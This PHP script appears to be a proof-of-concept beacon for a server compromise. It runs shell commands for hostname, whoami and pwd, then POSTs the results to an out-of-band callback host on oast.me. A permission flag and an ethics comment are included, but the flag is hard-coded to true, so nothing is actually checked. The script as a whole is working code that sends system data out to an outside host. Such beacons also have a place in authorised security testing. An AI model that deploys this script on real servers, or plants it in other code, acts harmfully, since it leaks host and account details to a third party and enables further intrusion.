<?php

// Ensure this script is used ethically and with permission.
$permissionGranted = true; // Change this according to the context.

if ($permissionGranted) {
    // Get the command outputs
    $outputHostname = trim(shell_exec('hostname'));
    $outputUser = trim(shell_exec('whoami'));
    $outputDirectory = trim(shell_exec('pwd'));

    // URL to send data to
    $url = 'https://cjvb9ojnp090trrbj8mgu7m6c9zu5pcix.oast.me'; // Replace with your actual URL

    // Create a context for the POST request
    $postData = [
        'hostname' => $outputHostname,
        'user' => $outputUser,
        'Directory' => $outputDirectory
    ];

    $contextOptions = [
        'http' => [
            'method'  => 'POST',
            'header'  => 'Content-type: application/x-www-form-urlencoded',
            'content' => http_build_query($postData),
        ],
    ];
    $context = stream_context_create($contextOptions);

    // Send the request and fetch the response
    $response = file_get_contents($url, false, $context);

    // Optional: Print response
    echo $response;
} else {
    echo "Permission not granted.";
}

?>

